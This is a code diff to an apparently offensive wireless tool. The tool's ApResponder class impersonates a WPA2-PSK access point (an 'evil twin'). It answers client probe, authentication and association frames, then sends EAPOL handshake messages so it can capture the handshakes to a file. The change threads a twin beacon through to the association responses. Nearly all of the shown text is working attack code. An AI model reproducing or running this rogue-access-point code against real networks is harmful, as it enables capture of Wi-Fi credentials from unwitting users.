@@ -94,13 +94,14 @@ class ApResponder:
     version (campaigns/eviltwin) lands later; this proves the mechanism."""
 
     def __init__(self, iface, bssid: bytes, ssid: str, channel: int, beacon_frame: bytes,
-                 out_path: Path):
+                 twin_beacon: bytes, out_path: Path):
         self.iface = iface
         self.bssid = bssid
         self.bssid_str = _mac_str(bssid)
         self.ssid = ssid
         self.channel = channel
         self.beacon_frame = beacon_frame
+        self.twin_beacon = twin_beacon
         self.out_path = out_path
         self._probe_resp = probe_resp(bssid, ssid, channel)
         self.anonce: dict[bytes, bytes] = {}          # client -> ANonce we sent in M1
@@ -129,7 +130,8 @@ class ApResponder:
         elif subtype == 0x0B:                         # authentication
             self._send(auth_resp(self.bssid, client), "auth", client)
         elif subtype in (0x00, 0x02):                 # (re)association request
-            self._send(assoc_resp(self.bssid, client), "assoc", client)
+            self._send(assoc_resp(self.bssid, client, channel=self.channel, reassoc=subtype == 0x02,
+                                  twin_beacon=self.twin_beacon), "assoc", client)
             self._send_m1(client)
 
     def _send(self, frame: bytes, kind: str, client: bytes) -> None:
@@ -275,7 +277,7 @@ async def main(a) -> None:
         return
     print(f"[+] armed: hardware ACKs frames to {armed} on ch {a.channel}")
 
-    responder = ApResponder(apcard, twin_bssid, ssid, a.channel, beacon_frame, Path(a.out))
+    responder = ApResponder(apcard, twin_bssid, ssid, a.channel, beacon_frame, twin, Path(a.out))
     apcard.register_rx_callback(responder.on_rx)
     print(f"[*] beaconing '{ssid}' (WPA2-PSK) on ch {a.channel} as {armed}")
     print(f"[*] writing captures to {a.out}. Ctrl-C to stop.\n")
